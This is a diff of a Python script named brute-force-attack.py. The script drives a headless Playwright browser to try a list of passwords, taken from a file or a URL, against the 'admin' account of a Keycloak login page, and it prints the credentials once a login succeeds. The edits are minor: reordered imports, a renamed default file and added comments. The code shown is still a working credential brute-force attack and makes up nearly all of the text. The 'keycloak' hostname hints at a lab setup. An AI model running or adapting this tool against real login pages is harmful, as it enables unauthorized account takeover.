@@ -1,9 +1,9 @@
 #!/usr/bin/env python3
 
-import requests
-from playwright.sync_api import sync_playwright
 import os
 import sys
+import requests
+from playwright.sync_api import sync_playwright
 
 def get_passwords(password_source):
     """
@@ -36,17 +36,17 @@ def main():
     Attempts a brute-force attack to log in to Keycloak.
     """
     username = "admin"
-    password_source = "password_list.txt"
+    password_source = "passwords.txt"
 
     if len(sys.argv) > 1 and sys.argv[1] in ("-h", "--help"):
-        print("Usage: python3 brute-force-attack.py [username (optional, default: admin)] [password list file or URL (optional, default: password_list.txt)]")
+        print("Usage: python3 brute-force-attack.py [username (optional, default: admin)] [password list file or URL (optional, default: passwords.txt)]")
         print("Example: ./brute-force-attack.py")
         print("Example: ./brute-force-attack.py admin")
         print("Example: ./brute-force-attack.py admin passwords.txt")
         print("Example: ./brute-force-attack.py admin https://example.com/passwords.txt")
         sys.exit(0)
 
-    # Get password source from command-line arguments. Use default if not provided.
+    # Get username and passwords from command-line arguments. Use default if not provided.
     if len(sys.argv) == 2:
         username = sys.argv[1]
     elif len(sys.argv) == 3:
@@ -62,6 +62,7 @@ def main():
         browser = p.chromium.launch(headless=True)
         context = browser.new_context()
         page = context.new_page()
+        # Access to Keycloak account console
         page.goto("http://keycloak:8080/auth/realms/master/account")
 
         print(f"Starting brute-force attack for user '{username}'...")
@@ -70,10 +71,12 @@ def main():
             if (i + 1) % 10 == 0:
                 print(f"Completed {i + 1} attempts")
 
+            # Fill username and password and click login button
             page.fill('input#username', username)
             page.fill('input#password', password)
             page.click('input[type="submit"]')
 
+            # If login is successful, print the username and password
             if page.url.endswith('/auth/realms/master/account/'):
                 print("\n--- Login successful! ---")
                 print(f"Username: {username}")
